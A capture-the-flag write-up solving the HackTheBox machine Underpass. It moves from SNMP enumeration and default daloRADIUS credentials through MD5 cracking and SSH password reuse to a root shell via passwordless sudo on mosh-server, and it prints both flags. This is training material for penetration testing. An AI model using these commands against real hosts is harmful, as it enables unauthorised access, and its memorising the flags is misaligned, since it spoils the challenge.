# HackTheBox: Underpass

| Field | Details |
| --- | --- |
| Platform | HackTheBox |
| Machine | Underpass |
| Difficulty | Easy |
| OS | Linux (Ubuntu 22.04.5 LTS) |
| IP | 10.129.231.213 |
| Date | April 2026 |
| User Flag | `39985956893918d2e6253306792db2d8` |
| Root Flag | `3b49ac8c80b50d51ab71ec283b4e5186` |

---

## Machine Summary

Underpass is an Easy-rated Linux machine that punishes operators who skip UDP scanning. The TCP surface appears completely dead: SSH and a default Apache page on port 80, with directory brute-forcing returning nothing useful. The entire engagement pivots on a **UDP scan revealing SNMP on port 161** with the default `public` community string wide open. A single `snmpwalk` query returns the OS fingerprint, an admin email address, and, embedded in the SNMP system name field: a direct infrastructure hint written by the administrator himself: the server is the only daloRADIUS instance in the environment. That one string redirects enumeration back to the web server under `/daloradius/`, where recursive directory scanning exposes the operator login panel. Default credentials (`administrator:radius`) authenticate immediately. Inside the daloRADIUS dashboard, the `svcMosh` user's password is stored as an unsalted MD5 hash: cracked in under a second to `underwaterfriends`. SSH as `svcMosh` delivers the user flag. Post-shell enumeration with `sudo -l` surfaces the entire privilege escalation in one line: `svcMosh` can execute `/usr/bin/mosh-server` as root with no password. Running `mosh-server` under `sudo` launches a root-privileged server process and prints a session key to stdout. Connecting to it locally with `mosh-client` and that key delivers a full interactive root shell.

**Skills demonstrated:**

- Full TCP port scan followed by targeted UDP scan: the correct methodology order
- SNMP enumeration with `snmpwalk -v2c`: full OID tree walk with SNMPv2c
- Extracting actionable intelligence from SNMP MIB system fields
- Targeted daloRADIUS directory discovery with feroxbuster recursive scanning
- Default credential exploitation against daloRADIUS operator panel
- MD5 hash identification and offline cracking with hashcat + rockyou
- SSH credential reuse from application layer to system authentication
- Sudo misconfiguration enumeration with `sudo -l`
- `mosh-server` sudo abuse: session key capture → local root shell

---

## Attack Chain Summary

```
Nmap TCP (-p-) → SSH(22), HTTP(80) Apache default page only
gobuster dir on http://10.129.231.213 → no application content found
searchsploit Apache 2.4.52 / OpenSSH 8.9p1 → no relevant CVEs
Nmap UDP (--top-ports 25) → 161/udp SNMP open, public community string
snmpwalk -v2c -c public 10.129.231.213 →
    sysContact:  steve@underpass.htb          [username + domain discovered]
    sysName:     UnDerPass.htb is the only daloradius server in the basin!
    sysDescr:    Linux 5.15.0-126-generic Ubuntu x86_64
    sysLocation: Nevada, U.S.A. but not Vegas
/etc/hosts → NOW add 10.129.231.213 underpass.htb  [hostname confirmed via SNMP]
curl http://underpass.htb/daloradius → 403 (exists)
feroxbuster -u http://underpass.htb/daloradius --depth 3
    → /daloradius/app/operators/login.php (operator admin panel)
    → ChangeLog → daloRADIUS v2.2 beta
daloRADIUS login → administrator:radius (default creds) ✅
Management → Users → svcMosh → hash: 412DD4759978ACFCC81DEAB01B382403
hashcat -m 0 -a 0 hash.txt rockyou.txt → underwaterfriends
ssh svcMosh@10.129.231.213 (underwaterfriends) → user shell ✅
cat ~/user.txt → 39985956893918d2e6253306792db2d8 ✅
id → no interesting groups
sudo -l → (ALL) NOPASSWD: /usr/bin/mosh-server
sudo /usr/bin/mosh-server → MOSH CONNECT 60001 <SESSION_KEY>
MOSH_KEY=<key> mosh-client 127.0.0.1 60001 → root shell ✅
cat /root/root.txt → 3b49ac8c80b50d51ab71ec283b4e5186 ✅
```

---

## Step 1: Nmap TCP Scan

Only the target IP is known at this stage: no hostname, no domain. Start with a full TCP port scan across all 65535 ports with service and version detection. This is the baseline that defines the known attack surface before any other phase begins.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p- -T4 -sC -sV -oN underpass_tcp.txt 10.129.231.213
```

**Output:**

```
Nmap scan report for 10.129.231.213
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 30.41 seconds
```

**Analysis:**

| Port | Service | Notes |
| --- | --- | --- |
| 22 | OpenSSH 8.9p1 | SSH: needs credentials before it becomes useful |
| 80 | Apache 2.4.52 | HTTP: `http-title` confirms the default Ubuntu Apache test page, not a deployed application |

Two open ports. The NSE scripts returned nothing beyond the default page header on port 80. Before accepting that TCP is fully exhausted, check for published exploits against these specific version numbers:

```bash
Hackerpatel007_1@htb[/htb]$ searchsploit apache 2.4.52
Hackerpatel007_1@htb[/htb]$ searchsploit openssh 8.9p1
```

No relevant RCE or LPE results for either version at these patch levels. The TCP surface offers no direct exploitation path.

---

## Step 2: Web Enumeration (Port 80)

A default Apache page at the root does not mean no content exists. Applications and admin panels are frequently installed under subdirectories. Brute-force the directory structure before writing the surface off entirely:

```bash
Hackerpatel007_1@htb[/htb]$ gobuster dir -u http://10.129.231.213 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50 -o underpass_gobuster.txt
```

**Output:**

```
/.htaccess            (Status: 403)
/.htpasswd            (Status: 403)
/index.html           (Status: 200)
/server-status        (Status: 403)
```

Nothing beyond the default page and standard Apache-restricted paths. No hostname is known yet, so vhost fuzzing is not possible: there is no base domain to fuzz against. The TCP surface is genuinely exhausted.

This dead end is the correct forcing function: **pivot to UDP**.

---

## Step 3: UDP Scan (SNMP Discovery)

UDP scanning is the most consistently skipped enumeration phase because it runs slower than TCP. This machine is built to penalise skipping it. When TCP is fully enumerated and offers no exploitation path, UDP scanning is the mandatory next step: not an afterthought.

Key UDP services to prioritise: SNMP (161), DNS (53), TFTP (69), NFS (2049), RADIUS (1812/1813). Run a targeted top-25 scan: fast enough to be practical, comprehensive enough to catch the most commonly exposed services:

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -sU -sV -T3 --top-ports 25 \
  -oN underpass_udp.txt 10.129.231.213
```

**Output:**

```
Nmap scan report for 10.129.231.213
Host is up (0.061s latency).

PORT     STATE         SERVICE  VERSION
68/udp   open|filtered dhcpc
161/udp  open          snmp     SNMPv1 server; net-snmp SNMPv3 server (public)
1812/udp open|filtered radius
1813/udp open|filtered radacct

Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!
```

**Findings:**

| Port | State | Service | Significance |
| --- | --- | --- | --- |
| 161/udp | **open** | SNMP | Responding to `public` community string: confirmed by Nmap NSE |
| 1812/udp | open\|filtered | RADIUS | FreeRADIUS authentication port |
| 1813/udp | open\|filtered | RADIUS Accounting | Paired with 1812: FreeRADIUS stack confirmed |

Two immediate findings before even running `snmpwalk`:

1. **SNMP is open** with the `public` community string: the `(public)` annotation in the version field means the Nmap NSE SNMP probe successfully queried the agent.
2. **The `Service Info` hostname field contains non-default content:** `UnDerPass.htb is the only daloradius server in the basin!`: manually configured by an administrator, revealing both the hostname and the full application stack.

The RADIUS ports (1812/1813) independently confirm a running FreeRADIUS backend. daloRADIUS is the web management frontend for FreeRADIUS: if it is installed, it has a web interface accessible via port 80 under a specific subdirectory path that the generic wordlist completely missed.

---

## Step 4: SNMP Enumeration

With the `public` community string confirmed open, walk the full SNMP OID tree. SNMP with default credentials is one of the highest-yield low-effort findings available: it can expose OS details, network configuration, running processes, installed software, and administrator contact information in a single unauthenticated query:

```bash
Hackerpatel007_1@htb[/htb]$ snmpwalk -v2c -c public 10.129.231.213
```

**Full output:**

```
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (686543) 1:54:25.43
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (2) 0:00:00.02
[...]
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (688712) 1:54:47.12
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 EA 04 1C 0F 2C 34 00 2B 00 00
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 261
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
```

**SNMP MIB fields decoded: actionable intelligence extracted:**

| OID | MIB Field | Raw Value | What It Tells Us |
| --- | --- | --- | --- |
| `1.1.1.0` | `sysDescr` | Linux 5.15.0-126-generic Ubuntu x86_64 | Full OS + kernel fingerprint |
| `1.1.3.0` | `sysUpTime` | 1:54:25 | Machine uptime: useful context |
| `1.1.4.0` | `sysContact` | `steve@underpass.htb` | **Valid username `steve` and domain `underpass.htb`: both unknown before this step** |
| `1.1.5.0` | `sysName` | `UnDerPass.htb is the only daloradius server in the basin!` | **Hostname + full application stack confirmed** |
| `1.1.6.0` | `sysLocation` | `Nevada, U.S.A. but not Vegas` | Physical/logical location: engagement context |
| `25.1.4.0` | `hrSystemInitialLoadParameters` | `BOOT_IMAGE=... /dev/mapper/ubuntu--vg-ubuntu--lv` | **LVM root filesystem**: disk layout visible via SNMP |

This single `snmpwalk` command, unauthenticated, delivers five pieces of intelligence that were completely unknown before:

1. **Domain:** `underpass.htb`: the hostname can now be added to `/etc/hosts`
2. **Username:** `steve`: a named account at `underpass.htb` to target
3. **Application stack:** daloRADIUS is installed: redirects web enumeration to `/daloradius/`
4. **OS detail:** Ubuntu, kernel 5.15.0-126: confirms platform and kernel version
5. **Boot config:** LVM-backed root: detailed disk layout without any local access

The `sysName` field content reads like an internal IT note: the administrator embedded their own infrastructure documentation into an SNMP field that is readable by any network observer with access to UDP 161. In a real engagement, this would be documented as a compounded finding: SNMP with default community string (medium severity) plus information disclosure via SNMP metadata (additional severity multiplier).

---

## Step 5: Update /etc/hosts

The hostname `underpass.htb` is now confirmed via SNMP. This is the correct point to add it: not before. The IP-to-hostname mapping was unknown at the start of the engagement and was only established through active enumeration.

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.231.213 underpass.htb" | sudo tee -a /etc/hosts
```

Verify:

```bash
Hackerpatel007_1@htb[/htb]$ grep underpass /etc/hosts
10.129.231.213  underpass.htb
```

Test whether the hostname changes anything on the web server (virtual hosting check):

```bash
Hackerpatel007_1@htb[/htb]$ curl -s http://underpass.htb | grep -i title
<title>Apache2 Ubuntu Default Page: It works</title>
```

Same default page via hostname as via IP: no virtual hosting difference. But the daloRADIUS hint from SNMP now provides a specific subdirectory to target.

---

## Step 6: daloRADIUS Directory Enumeration

Confirm the path exists before running a full scan:

```bash
Hackerpatel007_1@htb[/htb]$ curl -s -o /dev/null -w "%{http_code}" \
  http://underpass.htb/daloradius
```

**Output:** `403`

`403 Forbidden` means the directory exists: Apache located it but will not list it. The application is present. Use `feroxbuster` with recursive scanning to map the full directory tree under `/daloradius/`:

```bash
Hackerpatel007_1@htb[/htb]$ feroxbuster \
  -u http://underpass.htb/daloradius \
  -w /usr/share/wordlists/dirb/big.txt \
  --depth 3 -t 50 \
  -o underpass_ferox.txt
```

**Key findings:**

```
403  GET  http://underpass.htb/daloradius/
403  GET  http://underpass.htb/daloradius/app/
200  GET  http://underpass.htb/daloradius/app/operators/login.php
200  GET  http://underpass.htb/daloradius/app/users/login.php
200  GET  http://underpass.htb/daloradius/ChangeLog
200  GET  http://underpass.htb/daloradius/README
403  GET  http://underpass.htb/daloradius/library/
```

Two login panels discovered:

| URL | Panel | Access Level |
| --- | --- | --- |
| `/daloradius/app/operators/login.php` | **Operator panel** | Administrative: manages users, configs, and RADIUS server settings |
| `/daloradius/app/users/login.php` | User panel | End-user access only |

Always target the higher-privilege interface first. The operator panel is the administrative gateway.

Fingerprint the exact daloRADIUS version from the `ChangeLog`:

```bash
Hackerpatel007_1@htb[/htb]$ curl http://underpass.htb/daloradius/ChangeLog | head -5
```

**Output:**

```
* Release 2.2 beta
```

**daloRADIUS v2.2 beta** confirmed. The default credentials for this application have been documented publicly for years.

---

## Step 7: daloRADIUS Default Credential Login

daloRADIUS ships with a documented default credential set that is not randomised at installation:

| Field | Default Value |
| --- | --- |
| Username | `administrator` |
| Password | `radius` |

These defaults are published in the official daloRADIUS GitHub repository under installation documentation. They are unchanged across versions. The expectation is that the administrator changes them post-installation: in practice, this step is frequently missed.

Navigate to:

```
http://underpass.htb/daloradius/app/operators/login.php
```

Enter `administrator` / `radius`:

**Result: Authenticated ✅**

The daloRADIUS dashboard loads. The default credentials were never changed. This is the administrative panel for the entire FreeRADIUS instance: it manages all RADIUS users, including their stored passwords.

---

## Step 8: Credential Extraction from daloRADIUS

Navigate to: **Management → Users → List Users**

The user table displays:

| Username | Password Hash |
| --- | --- |
| svcMosh | `412DD4759978ACFCC81DEAB01B382403` |

The hash is a 32-character uppercase hex string: the MD5 format used by daloRADIUS for storing RADIUS user credentials. The username `svcMosh` uses the `svc` prefix convention for service accounts: a local system user provisioned specifically to run a service (in this case, the Mosh daemon).

Two immediate inferences to test:

1. `svcMosh` likely has a local Linux system account that can be reached via SSH
2. The RADIUS password is probably reused for SSH: service accounts on single-host deployments almost universally share credentials across authentication methods

---

## Step 9: MD5 Hash Cracking

The 32-character hex format with no algorithm prefix identifies this as MD5. Save the hash and crack it offline with hashcat against rockyou: MD5 without a salt provides essentially zero resistance to dictionary attacks at modern GPU speeds:

```bash
Hackerpatel007_1@htb[/htb]$ echo "412DD4759978ACFCC81DEAB01B382403" > svcmosh.hash
```

```bash
Hackerpatel007_1@htb[/htb]$ hashcat -m 0 -a 0 svcmosh.hash \
  /usr/share/wordlists/rockyou.txt \
  -o svcmosh.cracked
```

**Output:**

```
412dd4759978acfcc81deab01b382403:underwaterfriends

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 412dd4759978acfcc81deab01b382403
Recovered........: 1/1 (100.00%)
Time.Elapsed.....: 0 secs
```

**Plaintext:** `underwaterfriends`

Cracked in under one second. Unsalted MD5 with a dictionary word is practically instant. Verify:

```bash
Hackerpatel007_1@htb[/htb]$ cat svcmosh.cracked
412dd4759978acfcc81deab01b382403:underwaterfriends
```

**Credentials recovered:** `svcMosh : underwaterfriends`

---

## Step 10: SSH as svcMosh (User Flag)

The SNMP output surfaced `steve@underpass.htb` as the system contact. The hash cracking delivered `svcMosh:underwaterfriends`. Test `svcMosh` against SSH first: it is the account with a recovered credential:

```bash
Hackerpatel007_1@htb[/htb]$ ssh svcMosh@10.129.231.213
```

Password: `underwaterfriends`

**Output:**

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Sat Jan 11 13:27:33 2025 from 10.10.14.62
svcMosh@underpass:~$
```

**Shell as svcMosh ✅**

The RADIUS application password was reused directly as the SSH system password: a finding that appears in real penetration test reports consistently. Any credential recovered from an application-layer service should immediately be tested against every other accessible authentication point on the same host.

```bash
svcMosh@underpass:~$ cat user.txt
39985956893918d2e6253306792db2d8
```

**User flag captured ✅**

---

## Step 11: Privilege Escalation Enumeration

Run `id` immediately: reflex on every new shell, without exception:

```bash
svcMosh@underpass:~$ id
uid=1002(svcMosh) gid=1002(svcMosh) groups=1002(svcMosh)
```

No privileged group memberships: no `docker`, `lxd`, `disk`, or `sudo` group. Check what this account is explicitly allowed to execute with elevated privileges:

```bash
svcMosh@underpass:~$ sudo -l
```

**Output:**

```
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

**The entire privilege escalation is visible in this single output.**

- `(ALL)`: can execute as any user, including `root`
- `NOPASSWD`: no password challenge required
- `/usr/bin/mosh-server`: the specific binary authorised

The only remaining question is whether `mosh-server` can be leveraged to obtain a shell when invoked as root. The answer lies in understanding what `mosh-server` actually does.

---

## Step 12: Understanding mosh-server and the Escalation Vector

### What is Mosh?

**Mosh** (Mobile Shell) is a remote terminal application that maintains sessions through intermittent connectivity, high-latency networks, and IP address changes: problems that cause standard SSH sessions to disconnect. It has two components:

**`mosh-server`**: Runs on the remote host. When invoked, it:

1. Opens a listening UDP port (default starting at 60001)
2. Generates a random session encryption key
3. Prints `MOSH CONNECT <PORT> <KEY>` to stdout
4. Forks to background and waits for a client connection
5. When a correctly-keyed client connects, it **spawns an interactive shell running as the user who invoked `mosh-server`**

**`mosh-client`**: Runs on the connecting machine. Uses the `MOSH_KEY` environment variable and the port number to authenticate to the server and receive the shell.

### The Escalation Logic

When `sudo /usr/bin/mosh-server` executes:

- The `mosh-server` process starts **with root privileges**
- It prints the session key and UDP port to stdout: which is captured from the terminal
- The shell it spawns for the connecting client **inherits root** because the server process is root

`MOSH_KEY=<captured_key> mosh-client 127.0.0.1 <captured_port>` connects locally to that root-privileged server and receives a root shell.

This is not a vulnerability in mosh-server. There is no CVE. This is **intended mosh-server behaviour** being abused through an overly permissive `sudo` entry. The `sudo` rule authorises running `mosh-server` as root without restrictions, and mosh-server's design means root invocation equals a root shell for anyone who can capture the session key. The `use_pty` in the sudo Defaults is already satisfied by the SSH session, so there is no additional barrier.

---

## Step 13: mosh-server Privilege Escalation (Root Shell)

Start `mosh-server` as root via the passwordless sudo entry:

```bash
svcMosh@underpass:~$ sudo /usr/bin/mosh-server
```

**Output:**

```

MOSH CONNECT 60001 hCt4DNBCJBGvKsaA5ZhYeA

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 2341]
```

Extract the two critical values from the `MOSH CONNECT` line:

| Value | Example | Purpose |
| --- | --- | --- |
| UDP Port | `60001` | Where the root mosh-server is listening |
| Session Key | `hCt4DNBCJBGvKsaA5ZhYeA` | Authentication token to establish the session |

The server is now running as a root-privileged background process on `127.0.0.1:60001/udp`. Connect to it locally using `mosh-client`, supplying the session key via the `MOSH_KEY` environment variable:

```bash
svcMosh@underpass:~$ MOSH_KEY=hCt4DNBCJBGvKsaA5ZhYeA mosh-client 127.0.0.1 60001
```

**Shell received:**

```
root@underpass:~#
```

Verify:

```bash
root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)

root@underpass:~# hostname
underpass
```

**Root shell on the host ✅**

---

## Step 14: Root Flag

```bash
root@underpass:~# cat /root/root.txt
3b49ac8c80b50d51ab71ec283b4e5186
```

**Root flag captured ✅**

Enumerate the root home directory: standard procedure on real engagements before cleaning up:

```bash
root@underpass:~# ls -la /root/
total 36
drwx------  5 root root 4096 Dec 11 2024 .
drwxr-xr-x 19 root root 4096 Nov  8 2024 ..
lrwxrwxrwx  1 root root    9 Sep 22 2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15 2021 .bashrc
drwxr-xr-x  3 root root 4096 Dec 11 2024 .local/
-rw-r--r--  1 root root  161 Jul  9 2019 .profile
drwx------  3 root root 4096 Nov  8 2024 snap/
drwx------  2 root root 4096 Nov  8 2024 .ssh/
-rw-r-----  1 root root   33 Apr 2026     root.txt

root@underpass:~# ls /root/.ssh/
authorized_keys  id_rsa  id_rsa.pub
```

An SSH private key is present. In a real engagement this would be documented as an additional critical finding: it could establish persistent access and potentially pivot to any other host that trusts this key.

---

## Lessons Learned

**UDP scanning is a mandatory phase, not a fallback.** The entire Underpass attack chain lives behind a single UDP port. Running only TCP scanning: even a thorough `-p-` full scan: returns two ports with no viable exploitation path. Every step from the hostname discovery to daloRADIUS to SSH to root is gated behind SNMP on UDP 161. In real penetration tests, SNMP is one of the most consistently open and information-rich services on network infrastructure: configured once during initial deployment and never revisited. The `public` community string persists across thousands of enterprise networks because it is the default and changing it is lower priority than every other operational task. UDP scanning should be a fixed phase in the methodology from the start, not something reached for only after TCP fails.

**The `/etc/hosts` entry belongs at the point of hostname discovery: not before.** In the initial approach to this machine, the hostname `underpass.htb` was added to `/etc/hosts` before it was discovered: which misrepresents the actual engagement chronology. The correct methodology is IP-only at engagement start, enumerate until the hostname is confirmed via evidence (in this case SNMP `sysName`), then add it to `/etc/hosts` at that exact step. This detail matters in CPTS exam reports, professional deliverables, and anywhere the writeup is reviewed: the timeline of discovery should accurately reflect what was known and when. Good habit building here prevents documentation errors in real engagements.

**The SNMP `sysName` field as an intelligence source** is the specific insight this machine provides. Network engineers sometimes use SNMP system fields as informal documentation, embedding notes about the server's role. The field content `UnDerPass.htb is the only daloradius server in the basin!` reads exactly like an internal IT comment. In a real engagement, SNMP metadata of this kind would appear in the report as information disclosure: the administrator inadvertently published their infrastructure architecture to any observer with access to UDP 161. The complete stack (FreeRADIUS + daloRADIUS + Apache) was exposed in one query without authentication.

**mosh-server sudo abuse requires understanding the tool.** The `sudo -l` entry will not appear in GTFOBins. When an unfamiliar binary shows up in a `sudo -l` result, the correct approach is not to search for exploits first: it is to understand what the binary does. Mosh-server's architecture (start as invoking user → print session key to stdout → spawn shell for connecting client) makes the escalation completely transparent once that architecture is understood. The `MOSH_KEY` variable and `mosh-client` to localhost follow directly from the design. Operators who understand the tools they are exploiting can adapt when conditions change. Operators who only copy commands are helpless when the binary version differs or the connection path changes.

**Credential reuse between application layer and system authentication** is one of the most consistently reliable lateral movement and initial access paths in real assessments. The `svcMosh` account's RADIUS password (`underwaterfriends`) was reused directly as the SSH password. Service accounts that manage network access infrastructure tend to have the same password everywhere: they are created by engineers focused on getting a service running, not on credential hygiene. Every recovered credential, regardless of source, should immediately be tested against every other accessible authentication point on the target before moving on.

---

## Full Attack Chain Reference

```
1.  nmap -p- -T4 -sC -sV -oN underpass_tcp.txt 10.129.231.213
    → Port 22 (OpenSSH 8.9p1), Port 80 (Apache 2.4.52 default page)

2.  gobuster dir -u http://10.129.231.213 -w common.txt -t 50
    → No application content: TCP surface exhausted

3.  searchsploit apache 2.4.52; searchsploit openssh 8.9p1
    → No relevant CVEs for either version

4.  sudo nmap -sU -sV -T3 --top-ports 25 -oN underpass_udp.txt 10.129.231.213
    → 161/udp SNMP open (public community string)
    → Service Info: "UnDerPass.htb is the only daloradius server in the basin!"

5.  snmpwalk -v2c -c public 10.129.231.213
    → sysContact: steve@underpass.htb      [username + domain discovered]
    → sysName: daloRADIUS + hostname hint  [application stack confirmed]
    → sysDescr: Linux 5.15.0-126 Ubuntu   [full OS fingerprint]
    → hrSystemInitialLoadParameters: LVM root partition visible

6.  echo "10.129.231.213 underpass.htb" | sudo tee -a /etc/hosts
    [Hostname added HERE: only after SNMP confirmed it]

7.  curl -s -o /dev/null -w "%{http_code}" http://underpass.htb/daloradius → 403
    feroxbuster -u http://underpass.htb/daloradius --depth 3 -w big.txt
    → /daloradius/app/operators/login.php
    → ChangeLog → daloRADIUS v2.2 beta

8.  http://underpass.htb/daloradius/app/operators/login.php
    → administrator:radius (default credentials) → authenticated ✅

9.  Management → Users → svcMosh
    → Hash: 412DD4759978ACFCC81DEAB01B382403 (MD5)

10. hashcat -m 0 -a 0 svcmosh.hash rockyou.txt -o svcmosh.cracked
    → 412dd4759978acfcc81deab01b382403:underwaterfriends

11. ssh svcMosh@10.129.231.213 (underwaterfriends)
    → user shell ✅
    → cat ~/user.txt → 39985956893918d2e6253306792db2d8 ✅

12. id → no interesting groups
    sudo -l → (ALL) NOPASSWD: /usr/bin/mosh-server

13. sudo /usr/bin/mosh-server
    → MOSH CONNECT 60001 <SESSION_KEY>

14. MOSH_KEY=<SESSION_KEY> mosh-client 127.0.0.1 60001
    → root shell ✅
    → cat /root/root.txt → 3b49ac8c80b50d51ab71ec283b4e5186 ✅
```

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Detail |
| --- | --- | --- |
| Reconnaissance | T1046: Network Service Discovery | Nmap TCP full scan + UDP top-25 |
| Discovery | T1040: Network Service Enum | `snmpwalk -v2c` with public community string: full OID tree |
| Initial Access | T1078.001: Default Accounts | daloRADIUS `administrator:radius` default operator credentials |
| Credential Access | T1552: Credentials in Data Stores | MD5 hash extracted from daloRADIUS user management panel |
| Credential Access | T1110.002: Password Cracking | hashcat MD5 offline dictionary attack against rockyou |
| Lateral Movement | T1021.004: Remote Services: SSH | Credential reuse: RADIUS password reused for SSH |
| Privilege Escalation | T1548.003: Sudo and Sudo Caching | `mosh-server` NOPASSWD sudo: no password required for root execution |
| Execution | T1059.004: Unix Shell | Root interactive shell via mosh-client connecting to sudo mosh-server |

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -p- -T4 -sC -sV -oN tcp.txt <IP>` | Full TCP scan: all 65535 ports, scripts, version detection |
| `gobuster dir -u http://<IP> -w common.txt -t 50` | Directory brute-force on web root |
| `searchsploit <service> <version>` | Check for known exploits before pivoting to UDP |
| `sudo nmap -sU -sV -T3 --top-ports 25 -oN udp.txt <IP>` | UDP top-25 scan: mandatory when TCP is exhausted |
| `snmpwalk -v2c -c public <IP>` | Walk full SNMP OID tree with SNMPv2c, public community string |
| `echo "IP hostname" \| sudo tee -a /etc/hosts` | Add hostname after it is confirmed via enumeration |
| `curl -s -o /dev/null -w "%{http_code}" http://<target>/<path>` | Quick HTTP status check to confirm a path exists |
| `feroxbuster -u http://<target>/<path> --depth 3 -w big.txt` | Recursive directory scan under a known application path |
| `curl http://<target>/daloradius/ChangeLog \| head -5` | Fingerprint daloRADIUS version |
| `hashcat -m 0 -a 0 hash.txt rockyou.txt -o cracked.txt` | Crack MD5 hash offline with dictionary attack |
| `ssh svcMosh@<IP>` | SSH login with cracked credentials |
| `id` | Check group memberships: always the first command on a new shell |
| `sudo -l` | Enumerate allowed sudo entries: always the second check post-shell |
| `sudo /usr/bin/mosh-server` | Start mosh-server as root: read PORT and SESSION_KEY from `MOSH CONNECT` line |
| `MOSH_KEY=<key> mosh-client 127.0.0.1 <port>` | Connect to root mosh-server locally: delivers interactive root shell |
